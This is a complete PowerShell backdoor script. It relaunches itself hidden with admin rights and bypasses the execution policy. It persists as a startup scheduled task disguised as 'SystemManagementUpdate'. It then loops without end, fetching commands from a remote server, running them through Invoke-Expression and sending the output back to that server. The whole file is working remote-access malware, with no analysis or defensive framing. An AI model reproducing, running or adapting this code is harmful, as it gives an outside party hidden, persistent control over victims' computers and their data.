$cfHost = "https://connect.aniketpandey.website"
$logFile = Join-Path $PSScriptRoot "shell.txt"
$maxLogSizeMB = 5
$retryCount = 0
$maxRetries = 10
$cmdTimeout = 30
$maxResultBytes = 64000  # cap output size sent to server (~64KB)

# --- Self-elevate to admin and relaunch hidden ---
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

# --- Persistence ---
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Force | Out-Null

# --- Logging ---
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] [$Level] $Message"
    try {
        if (Test-Path $logFile) {
            $size = (Get-Item $logFile).Length / 1MB
            if ($size -ge $maxLogSizeMB) {
                Move-Item -Path $logFile -Destination "$logFile.old" -Force
            }
        }
        Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
    } catch {}
}

# --- Persistent HTTP helper (reuses connection via HttpWebRequest keep-alive) ---
# ServicePointManager settings: reuse TCP connections, skip cert issues
[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
[System.Net.ServicePointManager]::Expect100Continue = $false
try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}

function Get-Command-From-Server {
    try {
        $req = [System.Net.HttpWebRequest]::Create("$cfHost/cmd")
        $req.Method = "GET"
        $req.UserAgent = "Mozilla/5.0"
        $req.KeepAlive = $true
        $req.Timeout = 10000       # 10s connect+response timeout
        $req.ReadWriteTimeout = 10000
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $result = $reader.ReadToEnd().Trim()
        $reader.Close()
        $resp.Close()
        return $result
    } catch {
        throw $_
    }
}

function Send-Result-To-Server {
    param([string]$Body)
    try {
        # Truncate oversized output
        if ($Body.Length -gt $maxResultBytes) {
            $Body = $Body.Substring(0, $maxResultBytes) + "`n[...truncated at ${maxResultBytes} bytes]"
        }
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req = [System.Net.HttpWebRequest]::Create("$cfHost/result")
        $req.Method = "POST"
        $req.UserAgent = "Mozilla/5.0"
        $req.ContentType = "text/plain; charset=utf-8"
        $req.KeepAlive = $true
        $req.Timeout = 15000
        $req.ContentLength = $bytes.Length
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        $resp = $req.GetResponse()
        $resp.Close()
    } catch {
        Write-Log "Failed to send result: $($_.Exception.Message)" "WARN"
    }
}

# --- Execute command with timeout (using Runspace — lightweight, no new process) ---
function Invoke-CommandWithTimeout {
    param([string]$Command, [int]$Timeout)

    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $ps = [powershell]::Create()
    $ps.Runspace = $runspace
    $ps.AddScript(@"
        try {
            Invoke-Expression `$args[0] 2>&1 | Out-String
        } catch {
            "Error: " + `$_.Exception.Message
        }
"@).AddArgument($Command) | Out-Null

    $handle = $ps.BeginInvoke()

    # Wait with timeout
    $completed = $handle.AsyncWaitHandle.WaitOne($Timeout * 1000)

    if ($completed) {
        try {
            $output = $ps.EndInvoke($handle) -join "`n"
        } catch {
            $output = "Error collecting output: $($_.Exception.Message)"
        }
    } else {
        $ps.Stop()
        $output = "[!] Command timed out after ${Timeout}s.`n"
        Write-Log "Command timed out: $Command" "WARN"
    }

    $ps.Dispose()
    $runspace.Close()
    $runspace.Dispose()

    return $output
}

# --- Main loop ---
function Connect-Cloudflare {
    # Adaptive polling: ramp from 300ms (active) up to 5s (long idle)
    $activeDelay   = 300     # ms after receiving a command
    $idleStep1     = 1000    # ms: idle < 10 cycles
    $idleStep2     = 3000    # ms: idle 10–50 cycles
    $idleStep3     = 5000    # ms: idle > 50 cycles
    $consecutiveIdle = 0

    Write-Log "Client started. PID=$PID. Connecting to $cfHost"

    while ($true) {
        try {
            $command = Get-Command-From-Server

            if ($command -and $command -ne "") {
                $retryCount = 0
                $consecutiveIdle = 0

                Write-Log "CMD: $command"

                if ($command -eq "exit") {
                    Write-Log "Exit command received. Shutting down."
                    break
                }

                $result = Invoke-CommandWithTimeout -Command $command -Timeout $cmdTimeout

                # Log first 200 chars
                $logSnippet = if ($result.Length -gt 200) { $result.Substring(0, 200) } else { $result }
                Write-Log "OUT: $logSnippet"

                $body = "PS " + (Get-Location).Path + "> " + $command + "`n" + $result + "`n"
                Send-Result-To-Server -Body $body

                Start-Sleep -Milliseconds $activeDelay
            }
            else {
                $consecutiveIdle++

                # Adaptive idle delay — ramp up to save resources
                $delay = if ($consecutiveIdle -le 10) { $idleStep1 }
                         elseif ($consecutiveIdle -le 50) { $idleStep2 }
                         else { $idleStep3 }

                Start-Sleep -Milliseconds $delay
            }
        }
        catch {
            $retryCount++
            Write-Log "Connection error #$retryCount : $($_.Exception.Message)" "ERROR"

            $backoff = [Math]::Min(60, [Math]::Pow(2, $retryCount))
            Start-Sleep -Seconds $backoff

            if ($retryCount -ge $maxRetries) {
                Write-Log "Max retries ($maxRetries) hit. Resetting counter." "WARN"
                $retryCount = 0
            }
        }

        # Periodic GC during long idle
        if (($consecutiveIdle % 200) -eq 0 -and $consecutiveIdle -gt 0) {
            [System.GC]::Collect()
        }
    }
}

Connect-Cloudflare